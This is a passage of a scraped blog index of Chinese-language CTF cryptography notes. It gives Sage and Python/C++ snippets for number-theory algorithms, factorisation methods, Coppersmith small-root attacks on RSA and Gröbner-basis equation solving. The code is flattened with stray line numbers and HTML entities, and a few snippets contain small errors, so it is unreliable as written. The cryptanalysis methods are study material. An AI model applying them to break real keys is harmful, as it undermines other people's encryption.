E.order()#所有的点allPoints = E.points()#创建点P = E(2,1)#点的xy坐标值P.xy() ​ 解模方程 $ax^2+bx+c \\equiv d \\pmod p$ 1234P.&lt;x&gt; = PolynomialRing(Zmod(p))f = a * x^2 + b * x + c - dx = f.monic().roots()print(x) ​ 解方程组 $\\begin{cases} N=pq \\\\ \\varphi = (p-1)(q-1) \\end{cases} $ 12345678910111213141516P.&lt;p, q&gt; = PolynomialRing(ZZ)def solve(f1, f2): g = f1.resultant(f2, q) roots = g.univariate_polynomial().roots() if len(roots) == 0: return False p_ = abs(roots[0][0]) q_ = abs(roots[1][0]) return (min(p_, q_), max(p_, q_))N = phi = f1 = (N + 1) - phi - p - qf2 = N - p*qp, q = solve(f1, f2)(p, q) 参考： https://jayxv.github.io/2020/05/20/sage%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/ ​ 结式 12345678910111213from sage.matrix.matrix2 import Matrixdef resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))n = P.&lt;k,t2,t3,d&gt; = PolynomialRing(Integers(n))f1 = s1*k - h - r*df2 = s2*(k+t2) - h - r*df3 = s3*(k+t3) - h - r*dh1 = resultant(f1, f2, d)h2 = resultant(f1, f3, d)g1 = resultant(h1, h2, k)roots = g1.univariate_polynomial().roots() ​ WolframAlphahttps://www.wolframalpha.com/","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"Sage","slug":"Sage","permalink":"https://lazzzaro.github.io/tags/Sage/"},{"name":"gmpy2","slug":"gmpy2","permalink":"https://lazzzaro.github.io/tags/gmpy2/"}],"author":"Lazzaro"},{"title":"crypto常用算法","slug":"crypto-crypto常用算法","date":"2020-05-10T09:54:00.000Z","updated":"2022-09-05T15:35:23.922Z","comments":true,"path":"2020/05/10/crypto-crypto常用算法/","link":"","permalink":"https://lazzzaro.github.io/2020/05/10/crypto-crypto%E5%B8%B8%E7%94%A8%E7%AE%97%E6%B3%95/","excerpt":"","text":"欧几里得算法（辗转相除法）在数学中，辗转相除法，又称欧几里得算法（英语：Euclidean algorithm），是求最大公约数的算法。 两个整数的最大公约数是能够同时整除它们的最大的正整数。辗转相除法基于如下原理：两个整数的最大公约数等于其中较小的数和两数相除余数的最大公约数。在这个过程中，较大的数缩小了，所以继续进行同样的计算可以不断缩小这两个数直至其中一个变成零。这时，所剩下的还没有变成零的数就是两数的最大公约数。由辗转相除法也可以推出，两数的最大公约数可以用两数的整数倍相加来表示，如 $21 = 5 × 105 + (−2) × 252$。这个重要的结论叫做裴蜀定理。 在现代密码学方面，它是RSA算法的重要部分。它还被用来解丢番图方程，比如寻找满足中国剩余定理的数，或者求有限域中元素的逆。辗转相除法还可以用来构造连分数，在施图姆定理和一些整数分解算法中也有应用。辗转相除法是现代数论中的基本工具。 12345def gcd(a, b): if b == 0: return a else: return gcd(b, a % b) ​ 扩展欧几里得算法扩展欧几里得算法（英语：Extended Euclidean algorithm）是欧几里得算法（又叫辗转相除法）的扩展。已知整数 $a,b$，扩展欧几里得算法可以在求得$a,b$的最大公约数的同时，能找到整数 $x,y$（其中一个很可能是负数），使它们满足裴蜀定理 $ax + by = \\gcd(a, b)$如果 $a$ 是负数，可以把问题转化成 $|a|(-x)+by=\\gcd(|a|,b))$（$|a|$ 为 $a$ 的绝对值），然后令 $x’=(-x)$。通常谈到最大公约数时，我们都会提到一个非常基本的事实（由裴蜀定理给出）：给定二个整数 $a,b$，必存在整数 $x,y$ 使得 $ax + by = \\gcd(a, b)$。 众所周知，已知两个数 $a$ 和 $b$，对它们进行辗转相除（欧几里得算法），可得它们的最大公约数。不过，在欧几里得算法中，我们仅仅利用了每步带余除法所得的余数。扩展欧几里得算法还利用了带余除法所得的商，在辗转相除的同时也能得到裴蜀等式中的 $x,y$ 两个系数。以扩展欧几里得算法求得的系数是满足裴蜀等式的最简系数。 另外，扩展欧几里得算法是一种自验证算法，最后一步得到的 $s_{i+1}$ 和 $t_{i+1}$ 乘以 $\\gcd(a,b)$ 后恰为 $a$ 和 $b$，可以用来验证计算结果是否正确。 扩展欧几里得算法可以用来计算模反元素（也叫模逆元），求出模反元素是RSA加密算法中获得所需公钥、私钥的必要步骤。 1234567def ext_euclid(a, b): if b == 0: return 1, 0, a else: x, y, q = ext_euclid(b, a % b) x, y = y, (x - (a // b) * y) return x, y, q ​ 大步小步算法（BSGS算法）在群论中，大步小步算法（英语：baby-step giant-step）是丹尼尔·尚克斯发明的一种中途相遇算法，用于计算离散对数或者有限阿贝尔群的阶。其中离散对数问题在公钥加密领域有着非常重要的地位。 许多常用的加密系统都基于离散对数极难计算这一假设——计算越困难，这些系统提供的数据传输就越安全。增加离散对数计算难度的一种方法，是把密码系统建立在更大的群上。 这是一种空间换时间的算法，实质上是求解离散对数的朴素算法（枚举并试乘）的一个相当简单的改进。 大步小步算法常用于求解用于解决解高次同余方程的问题，问题形式如：有同余方程 $a^x \\equiv b \\pmod p$，$p$ 为质数，求最小非负整数解 $x$ 使得原方程成立。这类问题也称为离散对数问题。该算法的复杂度可以达到 $O(\\sqrt{p}\\log{n})$ 甚至更低。 原理 根据欧拉定理，我们知道模的剩余类有产生循环的情况，即 $a^0, a^1, \\ldots, a^{n-1}$ 模 $n$（质数）意义下的剩余类与 $a^n, a^{n+1}, \\ldots, a^{2n-1}$ 的剩余类相同，因此我们要的答案一定在 $[0, n-1]$ 内。我们考虑先求出一部分 $a$ 的幂次模 $p$ 意义下的值，将它们存起来，然后使得剩下没有求值的部分能够想个办法利用已求值直接查出来。我们想起了根号，不如直接令求值的长度为 $m=\\lceil \\sqrt{p} \\rceil$。下面要考虑的是没有求值部分怎么来求，比如 $a^m, \\ldots, a^{2m-1}$ 这一段，如果有解，一定是 $a^i \\cdot a^m \\equiv b \\pmod{p}$ 的情况，我们把那个 $a^m$ 移到右边来，就变成了 $a^i \\equiv b’ \\pmod{p}$ 且 $b’ = ba^{-m}$。既然这样，我们为什么不考虑直接查这个 $b’$ 有没有对应的i的答案。这样，没有求值的部分的每一段就可以只进行一次查询来判断该段内是否有解。这个保存，我们可以用一个map&lt;int,int&gt;来存，$x[i]$ 为余数为 $i$ 的 $a^x$ 中最小的 $x$ 值，则插入查询都为 $O(\\log n)$，总复杂度达到 $O(\\sqrt{n} \\log n)$。当然还可以用HashMap存，复杂度会更优一些。 123456789101112131415161718192021222324252627282930313233343536373839//C++#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;map&gt; using namespace std;typedef long long LL; LL quick_mod(LL a, LL b, LL c)//费马小定理+快速幂求逆元 &#123; LL ans = 1; while (b) &#123; if (b % 2 == 1) ans = (ans*a) % c; b /= 2; a = (a*a) % c; &#125; return ans;&#125; int log_mod(int a, int b, int n) &#123; int m, v, e = 1, i; m = (int)sqrt(n + 0.5); v = quick_mod(quick_mod(a, m, n),n-2, n); map&lt;int, int&gt; x; x[1] = 0; for (int i = 1; i &lt; m; i++) &#123; e = e*a%n; if (!x.count(e)) x[e] = i; &#125; for (i = 0; i &lt; m; i++) &#123; if (x.count(b)) return i*m + x[b]; b = b*v%n; &#125; return -1;&#125; 123456789101112#pythondef BSGS(g, y, p): m = int(sqrt(p)) if not is_square(p): m += 1 S = &#123;pow(g, j, p): j for j in range(m)&#125; gs = pow(g, inverse(m, p), p) for i in range(m): if y in S: return i * m + S[y] y = y * gs % p return None ​ 扩展大步小步算法（扩展BSGS算法） 原理 $p$ 非质数怎么办呢？并不是说 $p-1$ 以内没有答案，而是 $p$ 可能会很大。想个办法来缩小 $p$ 的范围。我们想起了一些同余性质，比如 $a \\equiv b \\pmod{m} \\Leftrightarrow \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{m}{d}}$，其中 $d$ 为 $a,b,m$ 的正公因数。我们想办法如此提公因数。从方程左边拆一个 $a$ 出来，提公因数，提完就变成这样一个式子 $a^{x-1} \\cdot \\frac{a}{d} \\equiv \\frac{b}{d} \\pmod{\\frac{p}{d}}$。直到某个时候 $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) = 1$。如果在提公因数的过程中，遇到 $\\mathrm{gcd}(a, \\frac{p}{\\prod_i d_i}) \\neq 1$ 且 $d$ 不能整除 $b$ 的情况，说明式子无解。 因为 $a^x, p$ 中的一个共同的因数$b$中没有，显然不存在这样的 $b$。结束以后，我们得到的会是一个这样的式子$a^{x-k} \\cdot \\frac{a^k}{\\prod_i d_i} \\equiv \\frac{b}{\\prod_i d_i} \\pmod{\\frac{p}{\\prod_i d_i}}$把分母搞掉$a^x \\equiv b \\pmod{\\frac{p}{\\prod_i d_i}}$这个直接扔给普通BSGS做就好了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687#include&lt;bits/stdc++.h&gt;using namespace std;typedef long long ll; inline int gcd(int a,int b)&#123; if(!b) return a; else&#123; while(int i=a%b)&#123; a=b; b=i; &#125; return b; &#125;&#125; inline int qpow(ll a,int n,int m) &#123; //这个快速幂保证p不是1，少模一次是一次 ll s=1; while(n) &#123; if(n&amp;1) s=s*a%m; a=a*a%m; n&gt;&gt;=1; &#125; return s;&#125; unordered_map&lt;int,int&gt; M;//要求a,n互质 a^x=b mod n .k,t是留给exbsgs调用的int bsgs(int a,int b,int n,int k=1,int t=0) &#123; if(b==1) return 0; M.clear(); int m=ceil(sqrt(n)); ll s=b;//BS for(int i=0; i&lt;m; i++,s=s*a%n) M[s]=i; s=k;//GS k=qpow(a,m,n); for(ll i=1; i&lt;=m; i++) &#123; s=s*k%n; if(M.count(s)) return i*m-M[s]+t; //这样就保证找到的是最小解了 &#125; return -1;&#125; //a^x=b mod nint exbsgs(int a,int b,int n) &#123; if(b==1) &#123; return 0; &#125; int d=gcd(a,n),k=1,t=0; while(d^1) &#123; if(b%d) &#123; return -1; &#125; ++t; b/=d; n/=d; k=(ll)k*(a/d)%n; if(b==k) &#123; return t; &#125; d=gcd(a,n); &#125; return bsgs(a,b,n,k,t);&#125; int main() &#123; int a,b,n; while(1) &#123; scanf(&quot;%d%d%d&quot;,&amp;a,&amp;n,&amp;b); if(!a&amp;&amp;!n&amp;&amp;!b) break; a%=n; b%=n; int ans=exbsgs(a,b,n); if(ans==-1) puts(&quot;No Solution&quot;); else printf(&quot;%d\\n&quot;,ans); &#125; return 0;&#125; ​ 威尔逊定理在初等数论中，威尔逊定理给出了判定一个自然数是否为质数的充分必要条件。即：当且仅当p为质数时： $ (p-1)! \\equiv -1 \\pmod p$但是由于阶乘是呈爆炸增长的，其结论对于实际操作意义不大。 推论 $ (p-2)! \\equiv 1\\pmod p$ ​ 欧拉定理在数论中，欧拉定理（也称费马-欧拉定理或欧拉$\\varphi$函数定理）是一个关于同余的性质。欧拉定理表明，若 $n,a$ 为正整数，且 $n,a$ 互素（即 $\\gcd(a,n)=1$），则 $a^{\\varphi (n)}\\equiv 1{\\pmod n}$即 $a^{\\varphi (n)}$ 与 $1$ 在模 $n$ 下同余；$\\varphi (n)$ 为欧拉函数。欧拉定理得名于瑞士数学家莱昂哈德·欧拉。 欧拉定理实际上是费马小定理的推广。 ​ 费马小定理费马小定理是数论中的一个定理。 假如 $a$ 是一个整数，$p$ 是一个质数，那么 $a^p-a$ 是 $p$ 的倍数，可以表示为： $a^p \\equiv a \\pmod p$如果 $a$ 不是 $p$ 的倍数，这个定理也可以写成： $a^{p-1} \\equiv 1 \\pmod p$这个书写方式更加常用。 ​ 费马商在费马小定理中，$\\frac{a^{p-1}-1}{p}$ 显然是一个整数。 这个整数被称作 $p$ 的以 $a$ 为基的费马商(Fermat Quotient)，记作 $q_p(a)$。 性质 （其中 $a,b$ 和 $p$ 互素） $q_p(ab) \\equiv q_p(a)+q_p(b) \\pmod p$ $q_p(a^r) \\equiv rq_p(a) \\pmod p$ $q_p(p \\mp 1) \\equiv \\pm 1 \\pmod p$ $q_p(p \\mp a) \\equiv q_p(a) \\pm \\frac{1}{a} \\pmod p$ $-2q_p(2) \\equiv -\\sum\\limits_{k = 1}^{p-1} \\frac{(-1)^{k-1}}{k} \\pmod p = 1+\\frac{1}{2}+\\cdots+\\frac{1}{\\frac{p-1}{2}} \\pmod p = \\sum\\limits_{k = 1}^{\\frac{p-1}{2}} \\frac{1}{k} \\pmod p$ ​ 中国剩余定理（孙子定理 / CRT） 定义 用现代数学的语言来说明的话，中国剩余定理给出了以下的一元线性同余方程组： $(S):\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ 有解的判定条件，并用构造法给出了在有解情况下解的具体形式。 说明 假设整数 $m_1,m_2,…,m_n$ 其中任两数互质，则对任意的整数：$a_1,a_2,…,a_n$，方程组 $(S)$ 有解，并且通解可以用如下方式构造得到： 设 $M=m_1×m_2×\\dots×m_n=\\prod\\limits_{i=1}^{n} m_i$ 是整数 $m_1,m_2,…,m_n$ 的乘积，并设 $M_i=\\cfrac{M}{m_i},\\forall i \\in \\{1,2,…,n\\}$，即 $M_i$ 是除了 $m_i$ 以为的 $n-1$ 个整数的乘积。 设 $t_i=M_i^{-1}$ 为 $M_i$ 模 $m_i$ 的数论倒数：$t_iM_i \\equiv 1 \\pmod {m_i},\\forall i \\in \\{1,2,…,n\\}$。 方程组 $(S)$ 的通解形式为： $x=a_1t_1M_1+a_2t_2M_2+\\dots+a_nt_nM_n+kM=kM+\\sum\\limits_{i=1}^{n}a_it_iM_i,\\quad k\\in \\mathbb{Z}$ 在模 $M$ 的意义下，方程组 $(S)$ 只有一个解：$x=\\sum\\limits_{i=1}^{n}a_it_iM_i$。 模不两两互质的同余式组可化为模两两互质的同余式组，再用孙子定理直接求解。 123456789#sagedef chinese_remainder(modulus, remainders): Sum = 0 prod = reduce(lambda a, b: a*b, modulus) for m_i, r_i in zip(modulus, remainders): p = prod // m_i Sum += r_i * (inverse_mod(p,m_i)*p) return Sum % prodchinese_remainder([3,5,7],[2,3,2]) #23 ​ 扩展中国剩余定理（扩展CRT / ExCRT）中国剩余定理是用来解同余方程组的，它要求 $m_1,m_2,…,m_n$其中两两互质。 模不两两互质的同余式组可化为模两两互质的同余式组，再用中国剩余定理直接求解。 形式 给定 $n$ 组非负整数 $m_i, a_i$ ，求解关于 $x$ 的方程组的最小非负整数解。 $\\left\\{\\begin{array} {c} x \\equiv a_1 \\pmod {m_1} \\\\ x \\equiv a_2 \\pmod {m_2} \\\\ \\vdots \\\\ x \\equiv a_n \\pmod {m_n} \\end{array} \\right.$ 解法 扩展中国剩余定理的方法和中国剩余定理关系不大，我们贪心处理前 $i-1$ 项，然后合并当前方程。 将每个方程拆成若干个方程 $x=a_i \\pmod {p_{i,j}^{k_{i,j}}}$，其中 $m_i=\\prod p_{i,j}^{k_{i,j}}$ 为$m_i$ 的分解式。 对每个质数 $p$，合并对应的所有方程，从而转化为模数两两互质的情形。若合并过程中出现矛盾，则原方程组无解。 12345678910111213#互质与不互质两种情况下都能工作良好的中国剩余定理（解同余方程组）def GCRT(mi, ai): # mi,ai分别表示模数和取模后的值,都为列表结构 assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) #不成立则不存在解 K = c / d * gmpy2.invert(curm / d, m / d) cura += curm * K curm = curm * m / d return (cura % curm, curm) #(解,最小公倍数) ​ 费马因式分解引理：如果 $n$ 是一个正奇数,那么 $n$ 分解为两个正整数的积和表示成两个平方数是一一对应的。 即：$n=ab=x^2-y^2=(x+y)(x-y)=\\left(\\cfrac{a+b}{2}\\right)^2-\\left(\\cfrac{a-b}{2}\\right)^2$。 因为 $n$ 为奇数，$a,b$ 必也为奇数，所以 $(a+b)$ 和 $(a-b)$ 必为偶数，故能被 $2$ 整除。 算法 从 $x=\\lceil\\sqrt{n}\\rceil+k,k \\in \\mathbb{Z}$ 开始，当 $(x^2-n)$ 可被完全开方，即 $x^2-n=y^2$ 时，即求出 $(x,y)$。 12345678910111213def fermat(x, mx): a = floor(sqrt(x)) b2 = a * a - x cnt = 0 while True: if is_square(b2): b = floor(sqrt(b2)) return a + b, a - b a += 1 cnt += 1 if cnt == mx: return b2 = a * a - x 123456789101112131415161718def fermat_factorization(n): factor_list = [] get_context().precision = 2048 x = int(sqrt(n)) print(x) while True: x += 1 y2 = x ** 2 - n if is_square(y2): print(&#x27;x = &#x27;,x) y2 = mpz(y2) get_context().precision = 2048 y = int(sqrt(y2)) factor_list.append([x+y, x-y]) if len(factor_list) == 2: break return factor_list ​ 高斯整数高斯整数 $\\mathbb{Z}[i]=\\{a+bi \\mid a,b \\in \\mathbb{Z}\\}$​。 对于 $z=x^2+y^2=(x+yi)(x-yi)=(y+xi)(y-xi)$​，且满足 $z=(a_1+b_1i)^t(a_1-b_1i)^t \\cdots (a_k+b_ki)^t(a_k-b_ki)^t$，可用于分解 $z$ 求得 $x,y$。 1234z = GI = GaussianIntegers()GI(z).factor()#因子组合 ​ CopperSmith攻击算法描述： 假设 $N$ 是一个未知因子组成的数，且存在一个因子 $b \\ge N^{\\beta},(0 \\lt \\beta \\le 1)$，$f(x)$ 是一个一元一次 $d$ 阶的多项式，且 $c \\ge 1$，那么可以在 $\\text{O}(cd^5\\log^9(N))$ 的复杂度内求解所有的 $x_0$。 $f(x_0) \\equiv 0 \\pmod b, x_0 \\le cN^{\\frac{\\beta^2}{d}}$ Coppersmith攻击与Don Coppersmith紧密相关，他提出了一种针对于模多项式（单变量，二元变量，甚至多元变量）找所有小整数根的多项式时间的方法。我们的目标是找到在模 $N$ 意义下多项式所有的根，这一问题被认为是复杂的，即满足下式的根： $F(x)=x^n+a_{n-1} x^{n-1}+ ···+ a_1 x+a_0 \\equiv 0 \\pmod N$ Coppersmith method 主要是通过 Lenstra–Lenstra–Lovász lattice basis reduction algorithm（LLL）方法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#Sage#单元PR.&lt;x&gt; = PolynomialRing(Zmod(n))f = (a + x)^e - croot = f.small_roots(X=2^256, beta=1)[0] # find root &lt; 2^256 with factor = n#调参#beta=0.48, epsilon=0.02#多元import itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []PR.&lt;a, b&gt; = PolynomialRing(Zmod(n))f = 4*r^2*a*b + 2*r*(a+b) + 1 - nroots = small_roots(f, (2^256, 2^256), m=3)a, b = roots[0]PR.&lt;x, y&gt; = PolynomialRing(Zmod(q)) # n = x*y# PR.&lt;x, y&gt; = Polygen(RealField(1000)) # n ≈ x*yf = (2^256 * a + x) * s - (2^256 + 1) * y * b - croots = small_roots(f, [2^256, 2^256], m=4, d=4)#其他多元load(&#x27;coppersmith.sage&#x27;)P.&lt;x, y&gt; = PolynomialRing(GF(p))f = 2^170 * a^2 + 2^86 * a * x + x^2 - 2^85 * b + c - yroots = coron(f, X=2^85, Y=2^85, k=1, debug=True) ​ Gröbner基 空间和域 理想 $F=\\{f_1,\\cdots,f_k\\}$ 是一个多项式集合，其生成的理想为集合元素的线性组合，组合系数也是多项式 $\\langle f_1,\\cdots,f_k \\rangle=\\biggl\\{ \\sum\\limits_{i=1}^k g_if_i \\vert g_1,\\cdots,g_k \\in K[x_1,\\cdots,x_n] \\biggr\\}$， 其中 $R=K[x_1,\\cdots,x_n]$ 是在域 $K$ 上的多项式环。 环 $R$ 的一个非空子集 $I$ ，如果对于 $R$ 的两个代数运算，满足条件：对任意 $a,b \\in I,r \\in R$，有 $a-b \\in I,ra \\in I$，则称 $I$ 是环 $R$ 的一个左理想。 环 $R$ 的一个非空子集 $I$ ，如果对于 $R$ 的两个代数运算，满足条件：对任意 $a,b \\in I,r \\in R$，有 $a-b \\in I,ar \\in I$，则称 $I$ 是环 $R$ 的一个右理想。 环 $R$ 的一个非空子集 $I$ ，如果既是左理想又是右理想，称 $I$ 为 $R$ 的双边理想，通常简称 $I$ 为 $R$ 的理想。 根据以下定理，每个理想都有一个生成集： Hilbert 基定理： 每个多项式理想 $I \\subseteq K[x_1,\\cdots,x_n]$ 都有一个有限生成集，即存在 $g_1,\\cdots,g_t \\in I$，使得 $I=\\langle g_1,\\cdots,g_t \\rangle$。 Gröbner基定义 对于单项式序下的多项式环 $K[x_1,\\cdots,x_n]$，理想 $I \\subseteq K[x_1,\\cdots,x_n]$ 的非 $\\{0\\}$ 且满足 $\\langle \\mathrm{LT}(g_1),\\cdots,\\mathrm{LT}(g_t) \\rangle=\\langle \\mathrm{LT}(I) \\rangle$ 的有限生成集 $G=\\{g_1,\\cdots,g_t\\}$，称为Gröbner基。定义 $\\{0\\}$ 的Gröbner基为空集 $\\varnothing$。 Gröbner基的两个应用，判断一个多项式是否属于当前的Gröbner基生成的理想 （即Ideal Membership problem），另一个应用就是解方程组。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#Sage###ZZ/QQ/RR#Example-1P.&lt;x, y&gt; = PolynomialRing(QQ)f1 = x^2 + x*y - 10f2 = x^3 + x^2*y - 20f3 = x^4 + x*y^3 - 70G = Ideal([f1, f2, f3]).groebner_basis()print(G)#Example-2PR = PolynomialRing(Zmod(N), &#x27;x&#x27;, len(Cs))x = PR.gens()f1 = (65537*x[0] - 66666*x[1] + 12345*x[2] - x[3])f2 = x[0] + x[1] + x[2] - sFs = [f1, f2]Fs.extend([(x[i]**e - Cs[i]) for i in range(l)])I = Ideal(Fs)B = I.groebner_basis()print(B)m = &#x27;&#x27;for b in B: assert b.degree() == 1 mi = ZZ(-b(0, 0, 0, 0)) print(mi)###Zmod(p)from sage.matrix.matrix2 import Matrix def resultant(f1, f2, var): return Matrix.determinant(f1.sylvester_matrix(f2, var))P.&lt;Rx, Ry, Qx, Qy&gt; = PolynomialRing(Zmod(p))f1 = Ry^2 - Rx^3 - a*Rx - bf2 = Qy^2 - Qx^3 - a*Qx - bf3 = (Qy + Ry)^2 + (Qx - Rx)^2 * (- Rx - Qx - Px)f4 = (- Qy - Ry) * (Rx - Px) + (Qx - Rx) * (- Ry - Py)f5 = Rx * Qx - NG = Ideal([f1, f2, f3, f4, f5]).groebner_basis()#结式+矩阵子式（西尔维斯特矩阵）print(&#x27;[!] computing resultant h1...&#x27;)h1 = resultant(G[0], G[1], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h2...&#x27;)h2 = resultant(G[0], G[2], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h3...&#x27;)h3 = resultant(G[3], G[4], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h4...&#x27;)h4 = resultant(G[3], G[5], Rx) # Ry, Qx, Qyprint(&#x27;[!] computing resultant h5...&#x27;)h5 = resultant(h1, h2, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h6...&#x27;)h6 = resultant(h3, h4, Ry) # Qx, Qyprint(&#x27;[!] computing resultant h7...&#x27;)h7 = resultant(h5, h6, Qy) # Qxprint(&#x27;[!] computing resultant h8...&#x27;)h8 = resultant(h7, f5, Qx) # Rxroots = h8.univariate_polynomial().roots()p, q = [ZZ(t[0]) for t in roots if ZZ(t[0]).is_prime()] ​ Diffie-Hellman密钥交换（DH密钥交换 / DHKE）Diffie-Hellman密钥交换（DHKE）是由Whitfield Diffie和Martin Hellman在1976年提出的。密钥交换方案提供了实际中密钥分配问题的解决方案，即允许双方通过不安全的信道进行交流获得一个共同密钥。许多公开和商业密码协议中都实现了这种基本的密钥协议技术。 基于乘法群： A和B协商一个有限循环群 $G$ 和它的一个生成元 $g$，一个大素数 $p$； A生成一个随机数 $a$，计算 $A=g^a \\pmod p$，将 $A$ 发送给B； B生成一个随机数 $b$，计算 $B=g^b \\pmod p$，将 $B$ 发送给A； A计算 $K=B^a \\pmod p=(g^b)^a \\pmod p$，得到共享密钥 $K$； B计算 $K=A^b \\pmod p=(g^a)^b \\pmod p$，得到共享密钥 $K$。 基于加法群： A和B协商一个有限循环群 $G$ 和它的一个生成元 $g$，一个大素数 $p$； A生成一个随机数 $a$，计算 $A=ag \\pmod p$，将 $A$ 发送给B； B生成一个随机数 $b$，计算 $B=bg \\pmod p$，将 $B$ 发送给A； A计算 $K=aB \\pmod p=a(bg) \\pmod p$，得到共享密钥 $K$； B计算 $K=bA \\pmod p=b(ag) \\pmod p$，得到共享密钥 $K$。 ​ 矩阵快速幂根据斐波那契的递推公式： $\\left\\{\\begin{array}{cl} f(n)&amp;=&amp;f(n-1)+f(n-2) \\\\ f(n-1)&amp;=&amp;f(n-1) \\end{array}\\right. \\Rightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ 设 $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=F(n)$，则 $F(n)=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix} \\cdot F(n-1)$ 把矩阵当成一个常数来看，即类似等比数列递推公式，即： $\\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} 1 &amp; 1 \\\\ 1 &amp; 0 \\end{bmatrix}^{n-1}\\begin{bmatrix} f(1) \\\\ f(0) \\end{bmatrix}$ 所以最终转换成一个求解矩阵幂运算的通项公式。 普通快速幂算法： 12345678910int qpow(int x, int n, int m) &#123; int res = 1; while (n) &#123; if (n &amp; 1) res = res * x % m; x = x * x % m; n &gt;&gt;= 1; &#125; return res;&#125; 根据矩阵乘法运算改写为矩阵快速幂： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &lt;iostream&gt;using namespace std;#define N 2struct matrix &#123; int m[N][N]; matrix() &#123; memset(m, 0, sizeof(m)); &#125; void prt();&#125;;void matrix::prt() &#123; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; cout &lt;&lt; this -&gt; m[i][j] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl; &#125;&#125;matrix operator * (const matrix a, const matrix b) &#123; matrix ans; for (int i = 0; i &lt; N; ++ i) &#123; for (int j = 0; j &lt; N; ++ j) &#123; for(int k = 0; k &lt; N; ++ k) &#123; ans.m[i][j] += a.m[i][k] * b.m[k][j]; &#125; &#125; &#125; return ans;&#125;matrix qpow(matrix x, int n) &#123; matrix res; for (int i = 0; i &lt; N; ++ i) &#123; res.m[i][i] = 1; &#125; while (n) &#123; if (n &amp; 1) res = res * x; x = x * x; n &gt;&gt;= 1; &#125; return res;&#125;int fib(int n) &#123; matrix a; a.m[0][0] = a.m[1][0] = a.m[0][1] = 1; matrix base; base.m[0][0] = 1; matrix ans = qpow(a, n - 1); ans = ans * base; return ans.m[0][0];&#125;int main() &#123; cout &lt;&lt; fib(1) &lt;&lt; endl; // 1 cout &lt;&lt; fib(2) &lt;&lt; endl; // 1 cout &lt;&lt; fib(3) &lt;&lt; endl; // 2 cout &lt;&lt; fib(4) &lt;&lt; endl; // 3 cout &lt;&lt; fib(5) &lt;&lt; endl; // 5 cout &lt;&lt; fib(6) &lt;&lt; endl; // 8 cout &lt;&lt; fib(7) &lt;&lt; endl; // 13&#125; 其他递推关系 $f(n)=af(n-1)+bf(n-2)\\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\end{bmatrix}=\\begin{bmatrix} a &amp; b \\\\ 1 &amp; 0 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\end{bmatrix}$ $f(n)=af(n-1)+bf(n-2)+c \\Longrightarrow \\begin{bmatrix} f(n) \\\\ f(n-1) \\\\ c \\end{bmatrix}=\\begin{bmatrix} a &amp; b &amp; 1 \\\\ 1 &amp; 0 &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ f(n-2) \\\\ c\\end{bmatrix}$ $f(n)=ac^n+bf(n-1)+d \\Longrightarrow \\begin{bmatrix} f(n) \\\\ c^n \\\\ d \\end{bmatrix}=\\begin{bmatrix} b &amp; ac &amp; 1 \\\\ 0 &amp; c &amp; 0 \\\\ 0 &amp; 0 &amp; 1 \\end{bmatrix}\\begin{bmatrix} f(n-1) \\\\ c^{n-1} \\\\ d\\end{bmatrix}$ $S(n)=A \\cdot S(n-1)+A\\Longrightarrow \\begin{bmatrix} S(n) \\\\ A \\end{bmatrix}=\\begin{bmatrix} A &amp; E \\\\ 0 &amp; E \\end{bmatrix}\\begin{bmatrix} S(n-1) \\\\ A \\end{bmatrix}$ 123456789101112131415161718192021222324#以2x2矩阵相乘为例m = [[1 for i in range(2)]for j in range(2)]m[1][1] = 0n = int(input())def mulMatrix(x,y): #定义二阶矩阵相乘的函数 